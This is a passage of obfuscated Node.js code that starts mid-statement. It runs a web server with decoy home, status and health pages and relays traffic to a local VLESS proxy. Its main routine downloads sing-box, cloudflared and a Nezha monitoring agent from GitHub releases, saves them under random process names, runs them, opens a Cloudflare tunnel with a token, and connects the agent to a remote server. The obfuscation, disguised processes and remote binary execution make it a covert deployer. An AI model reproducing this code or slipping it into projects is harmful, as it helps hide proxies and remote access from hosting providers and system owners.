URL(_0x538327[_0x1d12('0x72')]||'/',_0x1d12('0x13')+(_0x538327[_0x1d12('0x4f')]['host']||_0x1d12('0xb3')));if(_0x538327[_0x1d12('0xa2')]!=='GET'){_0x143151['writeHead'](0x195,{'Content-Type':_0x1d12('0x5f')});_0x143151['end']('Method\x20Not\x20Allowed');return;}if(_0x4565c1[_0x1d12('0xa8')]==='/'){_0x143151[_0x1d12('0x18')](0xc8,{'Content-Type':_0x1d12('0x8')});_0x143151[_0x1d12('0xaa')](HTML_TEMPLATES['home']);return;}if(_0x4565c1[_0x1d12('0xa8')]==='/status'||_0x4565c1['pathname']==='/x'){await renderStatus(_0x143151);return;}if(_0x4565c1[_0x1d12('0xa8')]==='/health'){_0x143151['writeHead'](0xc8,{'Content-Type':'application/json'});_0x143151[_0x1d12('0xaa')](JSON['stringify']({'status':'ok','uptime':process[_0x1d12('0xd')]()}));return;}_0x143151['writeHead'](0x194,{'Content-Type':_0x1d12('0x5f')});_0x143151[_0x1d12('0xaa')](_0x1d12('0x38'));});server['on'](_0x1d12('0x83'),(_0xd3d143,_0x2cf5c1,_0x42ee76)=>{if(!CONFIG[_0x1d12('0xb9')]){_0x2cf5c1['destroy']();return;}const _0x34c81e=net[_0x1d12('0x8b')]({'host':'127.0.0.1','port':Number(CONFIG['VLESS_PORT'])},()=>{const _0xed0a6a=_0xd3d143['method']+'\x20'+_0xd3d143['url']+_0x1d12('0x33')+_0xd3d143[_0x1d12('0x0')]+'\x0d\x0a';const _0x285dbb=Object['entries'](_0xd3d143[_0x1d12('0x4f')])[_0x1d12('0x27')](([_0xe75afd,_0x2810c6])=>_0xe75afd+':\x20'+formatHeaderValue(_0x2810c6))[_0x1d12('0x61')]('\x0d\x0a');_0x34c81e['write'](''+_0xed0a6a+_0x285dbb+'\x0d\x0a\x0d\x0a');if(_0x42ee76&&_0x42ee76['length'])_0x34c81e['write'](_0x42ee76);_0x2cf5c1['pipe'](_0x34c81e);_0x34c81e[_0x1d12('0x60')](_0x2cf5c1);});const _0x5c0ad0=()=>{try{_0x2cf5c1['destroy']();}catch(_0x13306c){}try{_0x34c81e[_0x1d12('0x56')]();}catch(_0x207888){}};_0x2cf5c1['on']('error',_0x5c0ad0);_0x34c81e['on']('error',_0x5c0ad0);});async function main(){server[_0x1d12('0x6c')](CONFIG['PORT'],()=>{serviceStatus[_0x1d12('0x22')]='running';});try{const _0x7fc422=detectArch();const _0x587116=_0x7fc422===_0x1d12('0x45');const _0x491b9d=getRandomProcessName();const _0xe8df67=getRandomProcessName();const _0x10c6a4=getRandomProcessName();const _0x44b283=path[_0x1d12('0x61')](WORK_DIR,_0x491b9d);const _0x3074a6=path[_0x1d12('0x61')](WORK_DIR,_0xe8df67);const _0x2d88e7=path[_0x1d12('0x61')](WORK_DIR,_0x10c6a4);const _0x1ebdb2={'singbox':_0x587116?_0x1d12('0x41'):'https://github.com/seav1/dl/releases/download/files/sb','cloudflared':_0x587116?_0x1d12('0xa4'):_0x1d12('0x89'),'nezha':_0x587116?_0x1d12('0x59'):_0x1d12('0x39')};await Promise['all']([downloadBinary(_0x1ebdb2[_0x1d12('0x34')],_0x44b283),downloadBinary(_0x1ebdb2[_0x1d12('0x30')],_0x3074a6),downloadBinary(_0x1ebdb2[_0x1d12('0x43')],_0x2d88e7)]);[_0x44b283,_0x3074a6,_0x2d88e7]['forEach'](_0x44868=>{if(!fs[_0x1d12('0x28')](_0x44868))throw new Error(_0x1d12('0x3e')+_0x44868);});const _0x5244b0=await getServerIP();if(CONFIG['HY2_PORT']||CONFIG[_0x1d12('0xb9')]||CONFIG[_0x1d12('0x51')]||CONFIG[_0x1d12('0x6d')]){await generateRealityKeys(_0x44b283);const _0x4d0393=await generateSingBoxConfig();try{await new Promise((_0x291264,_0x5e9c8e)=>{exec('\x22'+_0x44b283+'\x22\x20check\x20-c\x20\x22'+_0x4d0393+'\x22',_0x512c2f=>{if(_0x512c2f){_0x5e9c8e(_0x512c2f);}else{_0x291264();}});});await startService(_0x44b283,['run','-c',_0x4d0393],_0x1d12('0x34'));}catch(_0xec36b1){serviceStatus['singbox']=_0x1d12('0x86');}}if(CONFIG[_0x1d12('0x9')]){try{const _0x4ca51a=[_0x1d12('0x2d'),_0x1d12('0x52'),'auto',_0x1d12('0x53'),'http2','--no-autoupdate',_0x1d12('0xa'),'--token',CONFIG['C_T'],'--url',_0x1d12('0x70')+CONFIG['PORT']];await startService(_0x3074a6,_0x4ca51a,'cloudflared');}catch(_0xf2ac81){serviceStatus['cloudflared']='error';}}else if(CONFIG['VLESS_PORT']){const _0x5eee1d=await startTempTunnel(_0x3074a6,CONFIG[_0x1d12('0x58')]);if(!_0x5eee1d){serviceStatus['cloudflared']='error';}}if(CONFIG[_0x1d12('0x94')]&&CONFIG[_0x1d12('0xb8')]){const _0x1d0133={...process[_0x1d12('0x71')]};_0x1d0133['NZ_SERVER']=CONFIG[_0x1d12('0x94')]+':'+CONFIG[_0x1d12('0x80')];_0x1d0133[_0x1d12('0x8a')]=CONFIG[_0x1d12('0xb8')];if(CONFIG['NZ_UUID']){_0x1d0133['NZ_UUID']=CONFIG[_0x1d12('0x90')];}if(CONFIG['N_T']===_0x1d12('0xb1')||typeof CONFIG['N_T']===_0x1d12('0x98')&&CONFIG['N_T']['includes'](_0x1d12('0xb1'))){_0x1d0133['NZ_TLS']='true';}try{await startService(_0x2d88e7,[],'nezha',{'logFile':path['join'](WORK_DIR,'nezha.log'),'env':_0x1d0133});}catch(_0x39e8dc){serviceStatus[_0x1d12('0x43')]=_0x1d12('0x86');}}setInterval(()=>{processes[_0x1d12('0x76')](_0xf1cacd=>{if(_0xf1cacd['killed']){const _0x49cf3e=Object['keys'](serviceStatus)[_0x1d12('0x42')](_0x3e1b84=>serviceStatus[_0x3e1b84]===_0x1d12('0x20')&&!processes['some'](_0x168656=>_0x168656!==_0xf1cacd&&!_0x168656[_0x1d12('0x31')]));if(_0x49cf3e){serviceStatus[_0x49cf3e]=_0x1d12('0x77');}}});if(processes['length']>0x0&&processes['every'](_0x299960=>_0x299960[_0x1d12('0x31')])){cleanup();}},0x2710);process['on'](_0x1d12('0xab'),cleanup);process['on'](_0x1d12('0x23'),cleanup);}catch(_0x155760){process['exit'](0x1);}}main()[_0x1d12('0x2b')](()=>process['exit'](0x1));
